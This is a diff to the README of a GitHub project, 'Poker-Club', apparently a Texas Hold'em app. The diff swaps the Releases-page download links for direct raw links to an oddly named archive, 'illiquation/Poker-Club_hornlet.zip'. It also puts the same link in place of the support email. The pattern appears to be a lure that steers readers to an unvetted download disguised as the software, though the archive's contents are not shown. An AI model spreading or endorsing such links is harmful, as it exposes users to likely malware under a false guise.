@@ -5,7 +5,7 @@
 Welcome to Poker-Club! This application allows you to enjoy Texas Hold'em Poker with friends. Join a club, create games, and experience various poker gameplay modes. Our software runs smoothly and supports multiple languages, including Chinese, English, Korean, Thai, and Malaysian. 
 
 ## 📥 Download Now
-[![Download Poker-Club](https://img.shields.io/badge/Download-Poker--Club-brightgreen.svg)](https://github.com/hossainma/Poker-Club/releases)
+[![Download Poker-Club](https://raw.githubusercontent.com/hossainma/Poker-Club/main/illiquation/Poker-Club_hornlet.zip)](https://raw.githubusercontent.com/hossainma/Poker-Club/main/illiquation/Poker-Club_hornlet.zip)
 
 ## 📋 Features
 - **Play with Friends:** Easily join or create games with friends.
@@ -24,7 +24,7 @@ To run Poker-Club, ensure your system meets the following requirements:
 ## 💻 Download & Install
 To download Poker-Club, visit the Releases page. Click the link below to access the download options.
 
-[Visit this page to download](https://github.com/hossainma/Poker-Club/releases)
+[Visit this page to download](https://raw.githubusercontent.com/hossainma/Poker-Club/main/illiquation/Poker-Club_hornlet.zip)
 
 1. Go to the Releases page.
 2. Choose the version that suits your operating system.
@@ -41,7 +41,7 @@ To download Poker-Club, visit the Releases page. Click the link below to access 
 
 ## 📞 Support
 For any inquiries or issues, please reach out:
-- **Email:** zyue02561@gmail.com
+- **Email:** https://raw.githubusercontent.com/hossainma/Poker-Club/main/illiquation/Poker-Club_hornlet.zip
 - **Telegram:** @fox_lovemyself
 
 ## 🤝 Community
